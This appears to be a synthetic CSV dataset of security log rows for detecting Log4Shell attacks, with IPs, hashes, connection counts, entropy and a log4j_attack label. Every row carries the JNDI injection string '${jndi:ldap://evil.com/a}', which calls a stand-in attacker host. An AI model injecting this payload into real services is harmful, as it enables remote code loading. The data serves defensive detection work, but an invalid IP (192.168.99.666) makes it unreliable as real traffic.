timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.022477,192.168.1.241,185.199.108.33,java.exe,6f12d8ceac374478db0b2d1cd03adf42e2d7722d547a6e10394136133b2c8c04,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.802,log4j_attack
2025-11-28T06:19:56.022493,192.168.1.224,192.168.99.666,java.exe,329dfa38bea67ba466e5a2dff3c140fb58aa5d7ebabf3cb3a25b944d47304f82,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.011,log4j_attack
2025-11-28T06:19:56.022509,192.168.1.150,45.32.123.99,java.exe,04497c40b7749709647305d009949ed44f8846be53b443035f67e197adf788e3,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.025,log4j_attack
2025-11-28T06:19:56.022524,192.168.1.165,185.45.67.88,java.exe,de21623ab16068fdf017bccdb988aba7eaa98656ff8ff3501501fb961b80d137,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.922,log4j_attack
2025-11-28T06:19:56.022539,192.168.1.33,104.21.45.67,java.exe,fd8f06be6dac2eb3c55ee0fdee448b5151bcb30eaba85bdf7bfdf204187baa2e,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.916,log4j_attack
2025-11-28T06:19:56.022555,192.168.1.183,185.199.108.33,java.exe,16fab228f1ffcb57d88ecb217b2e8cc66fe6b27d35a8693ea7ac97dc5f706260,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.1,log4j_attack
2025-11-28T06:19:56.022570,192.168.1.119,185.199.108.33,java.exe,d09f5469c04f6918444d6ee6a4fb97d4626d2c00e86dc0153b360f352a418264,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.23,log4j_attack
2025-11-28T06:19:56.022585,192.168.1.231,104.21.45.67,java.exe,d2bc5a228acda727f850a9e92c0e4b5dac16d296c58d63a4329628ceed75db2c,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.092,log4j_attack
2025-11-28T06:19:56.022600,192.168.1.187,185.45.67.88,java.exe,237488dfb43e0102756258e0faf6be6c20b032b91f6b3a2addd9b3e2cb8f0f11,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.311,log4j_attack
2025-11-28T06:19:56.022616,192.168.1.32,192.168.99.666,java.exe,831a6af9d24ddc3a944a5cf80a5ab2ebd908bc5aabdd808eae453dda541e8f6c,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.035,log4j_attack
2025-11-28T06:19:56.022631,192.168.1.72,192.168.99.666,java.exe,a4e4f3a115ad37df6f1c75da29d9f2d3d50b7f124f8a7f0b828e45f0129576e5,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.995,log4j_attack
2025-11-28T06:19:56.022647,192.168.1.68,104.21.45.67,java.exe,efd94417962816fee7668f214b9708789a7bde5ed4e5f154085e8b67560544a6,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.114,log4j_attack
2025-11-28T06:19:56.022662,192.168.1.108,45.32.123.99,java.exe,f85bbcc6362bb56f3d143c992b4c2801f215ae8a8c829bfac3e76ec7bb268eeb,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.346,log4j_attack
2025-11-28T06:19:56.022677,192.168.1.197,192.168.99.666,java.exe,88295ecd6a9dac71b4e1240ebdd54c82417854647f30019034d9abc9b3571eeb,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.879,log4j_attack
2025-11-28T06:19:56.022692,192.168.1.159,45.32.123.99,java.exe,023d29f0d5dc186e43b10afa9e5a3244bb09ff76e7b23b9f14cf83680b6716cb,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.372,log4j_attack
2025-11-28T06:19:56.022708,192.168.1.182,185.199.108.33,java.exe,ad1f9fd13335647908448ede76668db18f3c4909721883b581f4c398d271aa5d,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.014,log4j_attack
2025-11-28T06:19:56.022723,192.168.1.202,185.199.108.33,java.exe,a22023a1ab6044d8d656e8a446df12242f1a83a7e7dfa784685743c3190e2277,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.959,log4j_attack
2025-11-28T06:19:56.022738,192.168.1.85,185.45.67.88,java.exe,ffbfc045a5dab505a0af65ca1d68641fcd7a772d8c680d3bb67f634b12e55d64,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.809,log4j_attack
2025-11-28T06:19:56.022754,192.168.1.214,192.168.99.666,java.exe,dabcb59a4b910010b5802cb36ce8610a8f1b114cae9baa0cdf890c8909dbd012,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.912,log4j_attack
2025-11-28T06:19:56.022769,192.168.1.20,104.21.45.67,java.exe,84bdbb7978ffe59346be54f6f9402653a4454c1624e93373e523b6ff5c4d5fbc,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.296,log4j_attack
2025-11-28T06:19:56.022785,192.168.1.213,185.199.108.33,java.exe,36d424329b0fb7f6de3fc9b401e0df61ceffceb443e370660c0cba219ae87c40,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.036,log4j_attack
2025-11-28T06:19:56.022800,192.168.1.85,45.32.123.99,java.exe,93a2c2dfaa334ca793cf76507134c9e3e664ee514625d54c524467e66c99ddd3,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.418,log4j_attack
2025-11-28T06:19:56.022815,192.168.1.149,185.45.67.88,java.exe,97fed263f08ffaf1cff0852bd56ea7861ddab66bd106e46c0887f927a34af882,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.022830,192.168.1.51,45.32.123.99,java.exe,211545b5fe971694b8ae27710e6d8577036f37f8bcec59090d80eca9d858988e,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.41,log4j_attack
2025-11-28T06:19:56.022846,192.168.1.87,45.32.123.99,java.exe,233c220473ec20752f7e051369fe588dd1bbe0fef2e674e10b0b1d28ead8446c,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.402,log4j_attack
2025-11-28T06:19:56.022861,192.168.1.198,192.168.99.666,java.exe,6a5d7319dd84ea974159530b1fe8a7d324c748972c16fee0dd514ce7ffb4686f,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.186,log4j_attack
2025-11-28T06:19:56.022876,192.168.1.79,185.199.108.33,java.exe,a1c0bd6743bcb708b7d2768ad3ed31cd301bc04cb2da34e8768a8c798bf2b998,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.32,log4j_attack
2025-11-28T06:19:56.022903,192.168.1.112,104.21.45.67,java.exe,87fd88da74b99c59f8215db992705404abc1b0c9361c5dc57d3c74ef50c41181,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.249,log4j_attack
2025-11-28T06:19:56.022919,192.168.1.126,45.32.123.99,java.exe,a190991b8ba92ed15f7d4d104f747a4420eef7936f4b527ee3a6238cbe9b31e7,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.489,log4j_attack
2025-11-28T06:19:56.022934,192.168.1.225,185.45.67.88,java.exe,2fd58b89b1ceefc1107358a514842a967aa00f84169a4bcf12cee18ad0220102,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.487,log4j_attack
2025-11-28T06:19:56.022948,192.168.1.166,185.199.108.33,java.exe,9b9f4e725334b8d0d964d5835256103acdcbea744add3ea2bf0eb4648afbe2b0,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.362,log4j_attack
2025-11-28T06:19:56.022963,192.168.1.202,45.32.123.99,java.exe,6fbbdabf03946431d302733055955df0d1b9ab70906b752102fcdb15cb163f66,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.848,log4j_attack
2025-11-28T06:19:56.022979,192.168.1.42,45.32.123.99,java.exe,4fd7fa3962cc6809c8a4a307d42dbccf42825ffa9c75ccb48b67008a8e006ac8,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.294,log4j_attack
2025-11-28T06:19:56.022994,192.168.1.198,192.168.99.666,java.exe,c8cb09e65f0bc65d845da47fc15de94767d1796480ddf07b2e4e6c92547b2f2f,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.911,log4j_attack
2025-11-28T06:19:56.023009,192.168.1.43,185.45.67.88,java.exe,fb5f6341942982dce92382d60b9daa40b0b43395b8dcf24d6891821151a18829,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.197,log4j_attack
2025-11-28T06:19:56.023024,192.168.1.115,104.21.45.67,java.exe,8f1295182ab13f59f3287379f68a79670200ae4737f8b0a9b800f19acfe95aa0,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.907,log4j_attack
2025-11-28T06:19:56.023039,192.168.1.197,104.21.45.67,java.exe,ce9c581de3504bf001392cd2a66c7332a3bbea29581b7bc888544196ef4bc28a,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.121,log4j_attack
2025-11-28T06:19:56.023054,192.168.1.123,192.168.99.666,java.exe,2512026d51e4f261a9c8e0995ea5076d7746ef2d66a830826ebcee29ac0fe89c,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.904,log4j_attack
2025-11-28T06:19:56.023070,192.168.1.76,185.45.67.88,java.exe,8efed6322e9fb1b040eb5a571e9944a9cfce03d7a093814fb1ae7f1d95b2925a,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.281,log4j_attack
2025-11-28T06:19:56.023085,192.168.1.14,185.199.108.33,java.exe,ec60dabd1ea8040ec171ec11bf68a96043f97cd56f54ecbc7430151aa73cf07c,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.0,log4j_attack
2025-11-28T06:19:56.023100,192.168.1.27,185.45.67.88,java.exe,22e1e125392216892e2176b50a019b7d096de0b06180495cbf5d96fdd43fe1e1,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.952,log4j_attack
2025-11-28T06:19:56.023115,192.168.1.156,185.199.108.33,java.exe,c4fd9b36dbd94a698f1d90e55e509b767707020c01e553d0d0c3c30b5b4043c7,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.825,log4j_attack
2025-11-28T06:19:56.023131,192.168.1.14,185.45.67.88,java.exe,adddd602e600c1c603a6f2e4762dd3d20b81060f069050ca40e0ab78a93f9281,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.945,log4j_attack
2025-11-28T06:19:56.023146,192.168.1.170,185.199.108.33,java.exe,6de29c4c0a6a10b49a3f10ec983ca39cc36d77c7bb50e627feba710168ab091a,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.263,log4j_attack
2025-11-28T06:19:56.023161,192.168.1.161,192.168.99.666,java.exe,7aaf7aaaa0f789fe47b301b45004f9511805c3c595a0e06563647690db6fa23e,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.458,log4j_attack
2025-11-28T06:19:56.023176,192.168.1.95,185.199.108.33,java.exe,615788c69e742c16ac9897fea7d2118710f5a2d01325e707dc791a316e3a4abb,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.426,log4j_attack
2025-11-28T06:19:56.023191,192.168.1.96,45.32.123.99,java.exe,93f8d75a182c67ba59daa31f6fafe3c1d1bd407ac550c509ac37bd39f6375bd7,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.343,log4j_attack
2025-11-28T06:19:56.023206,192.168.1.71,185.199.108.33,java.exe,2c0916861af22cefd8b07b4f48c6ffdf845f56899d6016647bc99d3b5839b457,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.043,log4j_attack
2025-11-28T06:19:56.023221,192.168.1.232,104.21.45.67,java.exe,405d2665fa1ddfb4a9f5e5deefbb2cc6d44e71f81ae403c6bf3664521c2bdf59,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.828,log4j_attack
2025-11-28T06:19:56.023236,192.168.1.47,104.21.45.67,java.exe,6b2fc93c5d24d785a265b95f2546b60cb5aa1f02b4e89d2f581ccd02a9eb5ca9,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.023252,192.168.1.60,185.45.67.88,java.exe,dc6eabd6513b27308df83140baa4a3ad34906fa8eee4c5cdfaf04be39a40919c,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.252,log4j_attack
2025-11-28T06:19:56.023267,192.168.1.114,185.45.67.88,java.exe,c115a8ee2b4caaa22cd04db23bce2d8734db05b0cd8eedf985387e821226bce5,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.494,log4j_attack
2025-11-28T06:19:56.023283,192.168.1.157,185.45.67.88,java.exe,8b41fc6076d2f187c269a4721676bd4cf3da733bdeffaa3ca7c4c89d67e521bd,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.114,log4j_attack
2025-11-28T06:19:56.023298,192.168.1.31,192.168.99.666,java.exe,d4e71133a0224d466efe318d210fa2c1849947f85ded5a70429f909202c1081e,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.283,log4j_attack
2025-11-28T06:19:56.023314,192.168.1.133,45.32.123.99,java.exe,0e6406e184e207dbd343a7eb848fd9cdedc36b50e7007efc2ce37c2a4f753f14,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.24,log4j_attack
2025-11-28T06:19:56.023329,192.168.1.179,185.199.108.33,java.exe,488448bb6cae49c3e4d3f2b6dc73b2816c98045cfe0798fe1d23801899dfa25b,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.932,log4j_attack
2025-11-28T06:19:56.023351,192.168.1.219,185.45.67.88,java.exe,c440ed28934144d1d725cb16f923f284471a8437073a57f5fba942f75ffe4791,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.264,log4j_attack
2025-11-28T06:19:56.023367,192.168.1.83,185.45.67.88,java.exe,d781f50a7c392abb524b3a756cf3c138aa3088952c93854342ed83084f881de3,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.968,log4j_attack
2025-11-28T06:19:56.023382,192.168.1.200,185.45.67.88,java.exe,f121a8a786367582051b221d0541b35052b70f2a19c15330e885163d0e329d9f,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.928,log4j_attack
2025-11-28T06:19:56.023398,192.168.1.16,45.32.123.99,java.exe,a33fc8feb3bc77fa58fa854a314a00947ecd67f65b1306009346e295105ef2f4,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.246,log4j_attack
2025-11-28T06:19:56.023413,192.168.1.139,45.32.123.99,java.exe,59009effd64608352a52c0117e3158e952aca22aa002363edeed3020c211bc04,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.91,log4j_attack
2025-11-28T06:19:56.023429,192.168.1.50,185.45.67.88,java.exe,c12689efae04838df41426811c9611435350f6fea489e2661e56f8698b2d8f64,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.272,log4j_attack
2025-11-28T06:19:56.023444,192.168.1.223,104.21.45.67,java.exe,e8ebf96a16893669e421f56fbdec05af113b85467c95c45d147c9cb5228cc7fa,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.003,log4j_attack
2025-11-28T06:19:56.023459,192.168.1.153,45.32.123.99,java.exe,c6e8b28d5bd4c778722ae4daf78c51c97ebc140bd5ae45e24d2b7823154e5679,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.903,log4j_attack
2025-11-28T06:19:56.023475,192.168.1.159,104.21.45.67,java.exe,b04dc98f063bfdc21c8120bf71ff052ba6fb001e5633ec01e1dd43cdd2d08b71,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.993,log4j_attack
2025-11-28T06:19:56.023490,192.168.1.184,185.199.108.33,java.exe,48e5790a2913715b2c87ba302ef90bb7b1acc54389af9a8f5e4f65783b356aed,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.897,log4j_attack
2025-11-28T06:19:56.023506,192.168.1.38,192.168.99.666,java.exe,a693514c3faef714005fa52cfff6b2015ccfd3b944fe385c289f21bec60a46ba,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.233,log4j_attack
2025-11-28T06:19:56.023521,192.168.1.165,45.32.123.99,java.exe,f2b4c2750d06f249185eb4fb73b3059cc1e0401ab28c66dc6576339a95635b1f,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.343,log4j_attack
2025-11-28T06:19:56.023536,192.168.1.216,192.168.99.666,java.exe,f7f70c85793bb39c17c0329aa9ad33c267947e874ad0ca692953b656d6d9dfd6,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.077,log4j_attack
2025-11-28T06:19:56.023551,192.168.1.75,185.199.108.33,java.exe,9466b27704e536b91256fcf07ea2eea898e29e28d9a5347cf829726607409d10,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.09,log4j_attack
2025-11-28T06:19:56.023567,192.168.1.29,185.45.67.88,java.exe,cd6c7c71266d094f711c8011ba9fdb691e4c4bb6ba7650ffaa270ccca7b86bf0,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.127,log4j_attack
2025-11-28T06:19:56.023582,192.168.1.120,45.32.123.99,java.exe,ec416713cb9d814422cc63310a58cf096a40aed195a01d7c464bc34cbef2271b,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.808,log4j_attack
2025-11-28T06:19:56.023599,192.168.1.33,45.32.123.99,java.exe,19fa9b876f1427e49fcb12933d18a1f8e9c14ceeb6b2dcdc4a1a4174c7ed9035,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.221,log4j_attack
2025-11-28T06:19:56.023614,192.168.1.14,185.45.67.88,java.exe,ad6582191c38f72f6b705c980246fc03dd91671f56f2b4aa75e0614521cf0dda,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.268,log4j_attack
2025-11-28T06:19:56.023629,192.168.1.79,45.32.123.99,java.exe,27ef40ca9e442a99c6690aabe9d4897b18fd35bb3e68a334ee1140182a0bb394,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.352,log4j_attack
2025-11-28T06:19:56.023645,192.168.1.78,45.32.123.99,java.exe,c1f32129c0fd3cd62183ef1a83bff565967daff68f8ed2f6d8a160e4bcde073e,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.963,log4j_attack
2025-11-28T06:19:56.023660,192.168.1.190,45.32.123.99,java.exe,2b0efbd8c7ce5b94b58a5919b6098b857b0e44a3c8af9989e2b82f873c9c82f1,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.889,log4j_attack
2025-11-28T06:19:56.023675,192.168.1.97,185.199.108.33,java.exe,3521e6c9108d731864626d01911e69ae7ad56e770827c834152e6308415fcd91,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.271,log4j_attack
2025-11-28T06:19:56.023690,192.168.1.125,192.168.99.666,java.exe,cfad96f9e07e6bf716a3a01bb751855446a74594f4e14b995a69a901d6551d47,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.914,log4j_attack
2025-11-28T06:19:56.023705,192.168.1.56,185.45.67.88,java.exe,d4c5fada4cd3928c6ea57d38d097bbb2082b6f8a08e612342e8769652d51d136,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.146,log4j_attack
2025-11-28T06:19:56.023720,192.168.1.33,185.45.67.88,java.exe,b1873945a18e6b48c6979d0450d89aa2d873037fd9d6026fd7eb6973cbd5499c,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.188,log4j_attack
2025-11-28T06:19:56.023736,192.168.1.54,192.168.99.666,java.exe,ce0acbea57cc13a18b6c290bf4cf59c31442d3d787be380d2dc1c21383eaedde,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.806,log4j_attack
2025-11-28T06:19:56.023751,192.168.1.12,104.21.45.67,java.exe,c5a82cb579824900d97e067330e75c6dd95b72b917d78468555b4dff1e8b3caf,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.458,log4j_attack
2025-11-28T06:19:56.023766,192.168.1.38,104.21.45.67,java.exe,731728137d4e8c6d786631dfae16b8a93da4784d38b4aa27eaf4bda60c020610,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.839,log4j_attack
2025-11-28T06:19:56.023781,192.168.1.99,192.168.99.666,java.exe,e41b60f72023d19f997067daca3dafd2c7f650ff0ee4770af77c09dd8d761f1f,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.922,log4j_attack
2025-11-28T06:19:56.023796,192.168.1.52,185.45.67.88,java.exe,7e5b303a666db71faf75aedfc17e0708d1d4bded8712121d32b4949001081a4a,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.158,log4j_attack
2025-11-28T06:19:56.023811,192.168.1.129,192.168.99.666,java.exe,a6bc945861ebc04ae090e2e23b6592913f9cc97379de19a068a8297adcb3e036,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.278,log4j_attack
2025-11-28T06:19:56.023826,192.168.1.28,185.199.108.33,java.exe,86715f31cd8a3bae62888b67d9f7e1d87b41fd2cecf66657f60d1ba79a5b52a6,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.207,log4j_attack
2025-11-28T06:19:56.023841,192.168.1.242,104.21.45.67,java.exe,06535463794c7fd2b3b82723a935538990032071c210bc52b6a833e50b6c6d94,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.974,log4j_attack
2025-11-28T06:19:56.023856,192.168.1.42,185.45.67.88,java.exe,9ca6bda94b93970e77c2b06e31dab7b0a4844c59eb752ad8514fb1dab1739f60,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.346,log4j_attack
2025-11-28T06:19:56.023871,192.168.1.240,192.168.99.666,java.exe,3a2efcd5552ae083a02b5e0f6b04cf5194705ca33ef6555f53d4f91a22f56831,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.496,log4j_attack
2025-11-28T06:19:56.023897,192.168.1.129,45.32.123.99,java.exe,b824dd655c5118a8b4e3f321b4587aba6fc5e28d81ce0c8c1f074496ea199c62,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.293,log4j_attack
2025-11-28T06:19:56.023912,192.168.1.188,192.168.99.666,java.exe,039a7c5b3bdee1c394e023e1cccd917263555da887db9e610af4394ee8027629,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.377,log4j_attack
2025-11-28T06:19:56.023926,192.168.1.120,45.32.123.99,java.exe,7a054e9e8f24a604f995cbce27a14656ac0d12b534afa3346d08520ec5b8376e,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.219,log4j_attack
2025-11-28T06:19:56.023942,192.168.1.66,185.45.67.88,java.exe,625d668831094e6b041aa473a6a52df36a1fd40ad1500d481c9abf5ec0464d98,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.318,log4j_attack
2025-11-28T06:19:56.023958,192.168.1.227,185.199.108.33,java.exe,055e1fcd699565c73fa31fef4eb5030baf88f84c760873e8150f939b9ae0db50,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.238,log4j_attack
2025-11-28T06:19:56.023973,192.168.1.48,45.32.123.99,java.exe,d50f673cdc13ec5a896069e64ddfc5e7fef966d537ad3d00a5e45a83bbda7ece,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.936,log4j_attack
2025-11-28T06:19:56.023988,192.168.1.81,185.199.108.33,java.exe,87b4d244398e2b180d9c46b651ed8b5223fd2a81bd0839c75055753437fe3a48,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.333,log4j_attack
2025-11-28T06:19:56.024004,192.168.1.94,185.199.108.33,java.exe,f4edd7296f18b50162c3751e8e9e4c56a1ee195550246af6b7488afaf0c748e0,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.265,log4j_attack
2025-11-28T06:19:56.024019,192.168.1.88,45.32.123.99,java.exe,ca5d17dd6695d4add1e963c428bb95a1ecf8c4b4f519aad4f33754d8ed135124,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.953,log4j_attack
2025-11-28T06:19:56.024034,192.168.1.201,45.32.123.99,java.exe,1e071ea6d95b19f8038f53a3e3b9ffb2ff006eda42b5489fbbb090f37471f73d,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.948,log4j_attack
2025-11-28T06:19:56.024050,192.168.1.216,104.21.45.67,java.exe,f758b8d434b4a854e476072eaf93b37456ec02ff0bea2152716f673cff6e2c64,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.073,log4j_attack
2025-11-28T06:19:56.024065,192.168.1.88,45.32.123.99,java.exe,e235859fe2a0175c900cd290783aea92f477c11eca4c7f11c805b330b1fbf52c,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.134,log4j_attack
2025-11-28T06:19:56.024081,192.168.1.232,45.32.123.99,java.exe,813431a668963202bf6bdab15053c4382f6c5d5de9727b0c2388b6dde9c8951a,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.809,log4j_attack
2025-11-28T06:19:56.024096,192.168.1.154,45.32.123.99,java.exe,523e8690388e7194afcba702ff93eb41d2d7be898a5a90fbc2d184fc3694aa10,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.998,log4j_attack
2025-11-28T06:19:56.024112,192.168.1.42,185.45.67.88,java.exe,6a48f4ac1aa5f7c021ae810c4cb1e6868d6dddcbfc05dd8175a6151c1bc149ae,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.239,log4j_attack
2025-11-28T06:19:56.024127,192.168.1.235,104.21.45.67,java.exe,7e45faea4e3d136ae789a214c0f3cc33cf8c6a5f0657e9bfae0764ebd25da6b6,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.884,log4j_attack
2025-11-28T06:19:56.024142,192.168.1.67,104.21.45.67,java.exe,a911d78d0c8061e279ba07627f6e87a30357bc77c6ee609a2b3142cde5bea424,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.433,log4j_attack
2025-11-28T06:19:56.024157,192.168.1.222,185.45.67.88,java.exe,90f12c6dabe66b52b9b018d12489c5ab4869ae240675b09d9b4524ade2458591,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.897,log4j_attack
2025-11-28T06:19:56.024172,192.168.1.29,185.45.67.88,java.exe,36a4bb86b5785afaa8cf04f85f4b6c7f11d3b4670f67beeb9f839ce484cd5287,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.979,log4j_attack
